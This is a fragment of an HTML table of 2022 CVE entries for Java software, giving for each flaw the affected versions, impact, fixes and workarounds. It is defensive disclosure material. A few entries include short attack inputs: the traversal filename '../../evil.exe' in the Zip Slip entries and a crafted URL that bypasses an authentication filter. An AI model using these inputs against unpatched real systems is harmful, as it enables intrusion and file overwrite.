	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-27669">CVE-2022-27669</a></td>
		<td valign="top">An unauthenticated user can use functions of XML Data Archiving Service of SAP NetWeaver Application Server for Java - version 7.50, to which access should be restricted. This may result in an escalation of privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-27203">CVE-2022-27203</a></td>
		<td valign="top">Jenkins Extended Choice Parameter Plugin 346.vd87693c5a_86c and earlier allows attackers with Item/Configure permission to read values from arbitrary JSON and Java properties files on the Jenkins controller.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-26133">CVE-2022-26133</a></td>
		<td valign="top">SharedSecretClusterAuthenticator in Atlassian Bitbucket Data Center versions 5.14.0 and later before 7.6.14, 7.7.0 and later prior to 7.17.6, 7.18.0 and later prior to 7.18.4, 7.19.0 and later prior to 7.19.4, and 7.20.0 allow a remote, unauthenticated attacker to execute arbitrary code via Java deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-25894">CVE-2022-25894</a></td>
		<td valign="top">All versions of the package com.bstek.uflo:uflo-core are vulnerable to Remote Code Execution (RCE) in the ExpressionContextImpl class via jexl.createExpression(expression).evaluate(context); functionality, due to improper user input validation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-25842">CVE-2022-25842</a></td>
		<td valign="top">All versions of package com.alibaba.oneagent:one-java-agent-plugin are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) using a specially crafted archive that holds directory traversal filenames (e.g. ../../evil.exe). The attacker can overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim&amp;#8217;s machine.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-25167">CVE-2022-25167</a></td>
		<td valign="top">Apache Flume versions 1.4.0 through 1.9.0 are vulnerable to a remote code execution (RCE) attack when a configuration uses a JMS Source with a JNDI LDAP data source URI when an attacker has control of the target LDAP server. This issue is fixed by limiting JNDI to allow only the use of the java protocol or no protocol.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24913">CVE-2022-24913</a></td>
		<td valign="top">Versions of the package com.fasterxml.util:java-merge-sort before 1.1.0 are vulnerable to Insecure Temporary File in the StdTempFileProvider() function in StdTempFileProvider.java, which uses the permissive File.createTempFile() function, exposing temporary file contents.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24897">CVE-2022-24897</a></td>
		<td valign="top">APIs to evaluate content with Velocity is a package for APIs to evaluate content with Velocity. Starting with version 2.3 and prior to 12.6.7, 12.10.3, and 13.0, the velocity scripts are not properly sandboxed against using the Java File API to perform read or write operations on the filesystem. Writing an attacking script in Velocity requires the Script rights in XWiki so not all users can use it, and it also requires finding an XWiki API which returns a File. The problem has been patched in versions 12.6.7, 12.10.3, and 13.0. There is no easy workaround for fixing this vulnerability other than upgrading and being careful when giving Script rights.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24860">CVE-2022-24860</a></td>
		<td valign="top">Databasir is a team-oriented relational database model document management platform. Databasir 1.01 has Use of Hard-coded Cryptographic Key vulnerability. An attacker can use hard coding to generate login credentials of any user and log in to the service background located at different IP addresses.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24847">CVE-2022-24847</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. The GeoServer security mechanism can perform an unchecked JNDI lookup, which in turn can be used to perform class deserialization and result in arbitrary code execution. The same can happen while configuring data stores with data sources located in JNDI, or while setting up the disk quota mechanism. In order to perform any of the above changes, the attack needs to have obtained admin rights and use either the GeoServer GUI, or its REST API. The lookups are going to be restricted in GeoServer 2.21.0, 2.20.4, 1.19.6. Users unable to upgrade should restrict access to the `geoserver/web` and `geoserver/rest` via a firewall and ensure that the GeoWebCache is not remotely accessible.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24846">CVE-2022-24846</a></td>
		<td valign="top">GeoWebCache is a tile caching server implemented in Java. The GeoWebCache disk quota mechanism can perform an unchecked JNDI lookup, which in turn can be used to perform class deserialization and result in arbitrary code execution. While in GeoWebCache the JNDI strings are provided via local configuration file, in GeoServer a user interface is provided to perform the same, that can be accessed remotely, and requires admin-level login to be used. These lookup are unrestricted in scope and can lead to code execution. The lookups are going to be restricted in GeoWebCache 1.21.0, 1.20.2, 1.19.3.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24839">CVE-2022-24839</a></td>
		<td valign="top">org.cyberneko.html is an html parser written in Java. The fork of `org.cyberneko.html` used by Nokogiri (Rubygem) raises a `java.lang.OutOfMemoryError` exception when parsing ill-formed HTML markup. Users are advised to upgrade to `&gt;= 1.9.22.noko2`. Note: The upstream library `org.cyberneko.html` is no longer maintained. Nokogiri uses its own fork of this library located at https://github.com/sparklemotion/nekohtml and this CVE applies only to that fork. Other forks of nekohtml may have a similar vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24827">CVE-2022-24827</a></td>
		<td valign="top">Elide is a Java library that lets you stand up a GraphQL/JSON-API web service with minimal effort. When leveraging the following together: Elide Aggregation Data Store for Analytic Queries, Parameterized Columns (A column that requires a client provided parameter), and a parameterized column of type TEXT. There is the potential for a hacker to provide a carefully crafted query that would bypass server side authorization filters through SQL injection. A recent patch to Elide 6.1.2 allowed the '-' character to be included in parameterized TEXT columns. This character can be interpreted as SQL comments ('--') and allow the attacker to remove the WHERE clause from the generated query and bypass authorization filters. A fix is provided in Elide 6.1.4. The vulnerability only exists for parameterized columns of type TEXT and only for analytic queries (CRUD is not impacted). Workarounds include leveraging a different type of parameterized column (TIME, MONEY, etc) or not leveraging parameterized columns.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24823">CVE-2022-24823</a></td>
		<td valign="top">Netty is an open-source, asynchronous event-driven network application framework. The package `io.netty:netty-codec-http` prior to version 4.1.77.Final contains an insufficient fix for CVE-2021-21290. When Netty's multipart decoders are used local information disclosure can occur via the local system temporary directory if temporary storing uploads on the disk is enabled. This only impacts applications running on Java version 6 and lower. Additionally, this vulnerability impacts code running on Unix-like systems, and very old versions of Mac OSX and Windows as they all share the system temporary directory between all users. Version 4.1.77.Final contains a patch for this vulnerability. As a workaround, specify one's own `java.io.tmpdir` when starting the JVM or use DefaultHttpDataFactory.setBaseDir(...) to set the directory to something that is only readable by the current user.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24818">CVE-2022-24818</a></td>
		<td valign="top">GeoTools is an open source Java library that provides tools for geospatial data. The GeoTools library has a number of data sources that can perform unchecked JNDI lookups, which in turn can be used to perform class deserialization and result in arbitrary code execution. Similar to the Log4J case, the vulnerability can be triggered if the JNDI names are user-provided, but requires admin-level login to be triggered. The lookups are now restricted in GeoTools 26.4, GeoTools 25.6, and GeoTools 24.6. Users unable to upgrade should ensure that any downstream application should not allow usage of remotely provided JNDI strings.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24816">CVE-2022-24816</a></td>
		<td valign="top">JAI-EXT is an open-source project which aims to extend the Java Advanced Imaging (JAI) API. Programs allowing Jiffle script to be provided via network request can lead to a Remote Code Execution as the Jiffle script is compiled into Java code via Janino, and executed. In particular, this affects the downstream GeoServer project. Version 1.2.22 will contain a patch that disables the ability to inject malicious code into the resulting script. Users unable to upgrade may negate the ability to compile Jiffle scripts from the final application, by removing janino-x.y.z.jar from the classpath.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24405">CVE-2022-24405</a></td>
		<td valign="top">OX App Suite through 7.10.6 allows OS Command Injection via a serialized Java class to the Documentconverter API.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24289">CVE-2022-24289</a></td>
		<td valign="top">Hessian serialization is a network protocol that supports object-based transmission. Apache Cayenne's optional Remote Object Persistence (ROP) feature is a web services-based technology that provides object persistence and query functionality to 'remote' applications. In Apache Cayenne 4.1 and earlier, running on non-current patch versions of Java, an attacker with client access to Cayenne ROP can transmit a malicious payload to any vulnerable third-party dependency on the server. This can result in arbitrary code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-24282">CVE-2022-24282</a></td>
		<td valign="top">A vulnerability has been identified in SINEC NMS (All versions &gt;= V1.0.3 &lt; V2.0), SINEC NMS (All versions &lt; V1.0.3), SINEMA Server V14 (All versions). The affected system allows to upload JSON objects that are deserialized to Java objects. Due to insecure deserialization of user-supplied content by the affected software, a privileged attacker could exploit this vulnerability by sending a maliciously crafted serialized Java object. This could allow the attacker to execute arbitrary code on the device with root privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23719">CVE-2022-23719</a></td>
		<td valign="top">PingID Windows Login prior to 2.8 does not authenticate communication with a local Java service used to capture security key requests. An attacker with the ability to execute code on the target machine maybe able to exploit and spoof the local Java service using multiple attack vectors. A successful attack can lead to code executed as SYSTEM by the PingID Windows Login application, or even a denial of service for offline security key authentication.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23612">CVE-2022-23612</a></td>
		<td valign="top">OpenMRS is a patient-based medical record system focusing on giving providers a free customizable electronic medical record system. Affected versions are subject to arbitrary file exfiltration due to failure to sanitize request when satisfying GET requests for `/images` &amp; `/initfilter/scripts`. This can allow an attacker to access any file on a system running OpenMRS that is accessible to the user id OpenMRS is running under. Affected implementations should update to the latest patch version of OpenMRS Core for the minor version they use. These are: 2.1.5, 2.2.1, 2.3.5, 2.4.5 and 2.5.3. As a general rule, this vulnerability is already mitigated by Tomcat's URL normalization in Tomcat 7.0.28+. Users on older versions of Tomcat should consider upgrading their Tomcat instance as well as their OpenMRS instance.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23596">CVE-2022-23596</a></td>
		<td valign="top">Junrar is an open source java RAR archive library. In affected versions A carefully crafted RAR archive can trigger an infinite loop while extracting said archive. The impact depends solely on how the application uses the library, and whether files can be provided by malignant users. The problem is patched in 7.4.1. There are no known workarounds and users are advised to upgrade as soon as possible.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23554">CVE-2022-23554</a></td>
		<td valign="top">Alpine is a scaffolding library in Java. Alpine prior to version 1.10.4 allows Authentication Filter bypass. The AuthenticationFilter relies on the request URI to evaluate if the user is accessing the swagger endpoint. By accessing a URL with a path such as /api/foo;%2fapi%2fswagger the contains condition will hold and will return from the authentication filter without aborting the request. Note that the principal object will not be assigned and therefore the issue wont allow user impersonation. This issue has been fixed in version 1.10.4. There are no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23553">CVE-2022-23553</a></td>
		<td valign="top">Alpine is a scaffolding library in Java. Alpine prior to version 1.10.4 allows URL access filter bypass. This issue has been fixed in version 1.10.4. There are no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23496">CVE-2022-23496</a></td>
		<td valign="top">Yet Another UserAgent Analyzer (Yauaa) is a java library that tries to parse and analyze the useragent string and extract as many relevant attributes as possible. Applications using the Client Hints analysis feature introduced with 7.0.0 can crash because the Yauaa library throws an ArrayIndexOutOfBoundsException. If uncaught the exception will result in a program crash. Applications that do not use this feature are not affected. Users are advised to upgrade to version 7.9.0. Users unable to upgrade may catch and discard any ArrayIndexOutOfBoundsException thrown by the Yauaa library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23463">CVE-2022-23463</a></td>
		<td valign="top">Nepxion Discovery is a solution for Spring Cloud. Discover is vulnerable to SpEL Injection in discovery-commons. DiscoveryExpressionResolver&amp;#8217;s eval method is evaluating expression with a StandardEvaluationContext, allowing the expression to reach and interact with Java classes such as java.lang.Runtime, leading to Remote Code Execution. There is no patch available for this issue at time of publication. There are no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23437">CVE-2022-23437</a></td>
		<td valign="top">There's a vulnerability within the Apache Xerces Java (XercesJ) XML parser when handling specially crafted XML document payloads. This causes, the XercesJ XML parser to wait in an infinite loop, which may sometimes consume system resources for prolonged duration. This vulnerability is present within XercesJ version 2.12.1 and the previous versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-23063">CVE-2022-23063</a></td>
		<td valign="top">In Shopizer versions 2.3.0 to 3.0.1 are vulnerable to Insufficient Session Expiration. When a password has been changed by the user or by an administrator, a user that was already logged in, will still have access to the application even after the password was changed.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-22536">CVE-2022-22536</a></td>
		<td valign="top">SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher are vulnerable for request smuggling and request concatenation. An unauthenticated attacker can prepend a victim's request with arbitrary data. This way, the attacker can execute functions impersonating the victim or poison intermediary Web caches. A successful attack could result in complete compromise of Confidentiality, Integrity and Availability of the system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-22533">CVE-2022-22533</a></td>
		<td valign="top">Due to improper error handling in SAP NetWeaver Application Server Java - versions KRNL64NUC 7.22, 7.22EXT, 7.49, KRNL64UC, 7.22, 7.22EXT, 7.49, 7.53, KERNEL 7.22, 7.49, 7.53, an attacker could submit multiple HTTP server requests resulting in errors, such that it consumes the memory buffer. This could result in system shutdown rendering the system unavailable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-22532">CVE-2022-22532</a></td>
		<td valign="top">In SAP NetWeaver Application Server Java - versions KRNL64NUC 7.22, 7.22EXT, 7.49, KRNL64UC, 7.22, 7.22EXT, 7.49, 7.53, KERNEL 7.22, 7.49, 7.53, an unauthenticated attacker could submit a crafted HTTP server request which triggers improper shared memory buffer handling. This could allow the malicious payload to be executed and hence execute functions that could be impersonating the victim or even steal the victim's logon session.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-22125">CVE-2022-22125</a></td>
		<td valign="top">In Halo, versions v1.0.0 to v1.4.17 (latest) are vulnerable to Stored Cross-Site Scripting (XSS) in the article tag. An authenticated admin attacker can inject arbitrary javascript code that will execute on a victim&amp;#8217;s server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-22124">CVE-2022-22124</a></td>
		<td valign="top">In Halo, versions v1.0.0 to v1.4.17 (latest) are vulnerable to Stored Cross-Site Scripting (XSS) in the profile image. An authenticated attacker can upload a carefully crafted SVG file that will trigger arbitrary javascript to run on a victim&amp;#8217;s browser.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-22123">CVE-2022-22123</a></td>
		<td valign="top">In Halo, versions v1.0.0 to v1.4.17 (latest) are vulnerable to Stored Cross-Site Scripting (XSS) in the article title. An authenticated attacker can inject arbitrary javascript code that will execute on a victim&amp;#8217;s server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21952">CVE-2022-21952</a></td>
		<td valign="top">A Missing Authentication for Critical Function vulnerability in spacewalk-java of SUSE Manager Server 4.1, SUSE Manager Server 4.2 allows remote attackers to easily exhaust available disk resources leading to DoS. This issue affects: SUSE Manager Server 4.1 spacewalk-java versions prior to 4.1.46. SUSE Manager Server 4.2 spacewalk-java versions prior to 4.2.37.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21700">CVE-2022-21700</a></td>
		<td valign="top">Micronaut is a JVM-based, full stack Java framework designed for building JVM web applications with support for Java, Kotlin and the Groovy language. In affected versions sending an invalid Content Type header leads to memory leak in DefaultArgumentConversionContext as this type is erroneously used in static state. ### Impact Sending an invalid Content Type header leads to memory leak in `DefaultArgumentConversionContext` as this type is erroneously used in static state. ### Patches The problem is patched in Micronaut 3.2.7 and above. ### Workarounds The default content type binder can be replaced in an existing Micronaut application to mitigate the issue: ```java package example; import java.util.List; import io.micronaut.context.annotation.Replaces; import io.micronaut.core.convert.ConversionService; import io.micronaut.http.MediaType; import io.micronaut.http.bind.DefaultRequestBinderRegistry; import io.micronaut.http.bind.binders.RequestArgumentBinder; import jakarta.inject.Singleton; @Singleton @Replaces(DefaultRequestBinderRegistry.class) class FixedRequestBinderRegistry extends DefaultRequestBinderRegistry { public FixedRequestBinderRegistry(ConversionService conversionService, List&lt;RequestArgumentBinder&gt; binders) { super(conversionService, binders); } @Override protected void registerDefaultConverters(ConversionService&lt;?&gt; conversionService) { super.registerDefaultConverters(conversionService); conversionService.addConverter(CharSequence.class, MediaType.class, charSequence -&gt; { try { return MediaType.of(charSequence); } catch (IllegalArgumentException e) { return null; } }); } } ``` ### References Commit that introduced the vulnerability https://github.com/micronaut-projects/micronaut-core/commit/b8ec32c311689667c69ae7d9f9c3b3a8abc96fe3 ### For more information If you have any questions or comments about this advisory: * Open an issue in [Micronaut Core](https://github.com/micronaut-projects/micronaut-core/issues) * Email us at [info@micronaut.io](mailto:info@micronaut.io)

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21675">CVE-2022-21675</a></td>
		<td valign="top">Bytecode Viewer (BCV) is a Java/Android reverse engineering suite. Versions of the package prior to 2.11.0 are vulnerable to Arbitrary File Write via Archive Extraction (AKA "Zip Slip"). The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../evil.exe). The Zip Slip vulnerability can affect numerous archive formats, including zip, jar, tar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim&amp;#8217;s machine. The impact of a Zip Slip vulnerability would allow an attacker to create or overwrite existing files on the filesystem. In the context of a web application, a web shell could be placed within the application directory to achieve code execution. All users should upgrade to BCV v2.11.0 when possible to receive a patch. There are no recommended workarounds aside from upgrading.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21634">CVE-2022-21634</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: LLVM Interpreter). Supported versions that are affected are Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Oracle GraalVM Enterprise Edition. CVSS 3.1 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21628">CVE-2022-21628</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Lightweight HTTP Server). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21626">CVE-2022-21626</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21624">CVE-2022-21624</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JNDI). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21619">CVE-2022-21619</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21618">CVE-2022-21618</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JGSS). Supported versions that are affected are Oracle Java SE: 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via Kerberos to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21597">CVE-2022-21597</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JavaScript). Supported versions that are affected are Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle GraalVM Enterprise Edition accessible data. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21565">CVE-2022-21565</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 12.1.0.2, 19c and 21c. Easily exploitable vulnerability allows low privileged attacker having Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java VM accessible data. CVSS 3.1 Base Score 6.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21549">CVE-2022-21549</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 17.0.3.1; Oracle GraalVM Enterprise Edition: 21.3.2 and 22.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21541">CVE-2022-21541</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u343, 8u333, 11.0.15.1, 17.0.3.1, 18.0.1.1; Oracle GraalVM Enterprise Edition: 20.3.6, 21.3.2 and 22.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
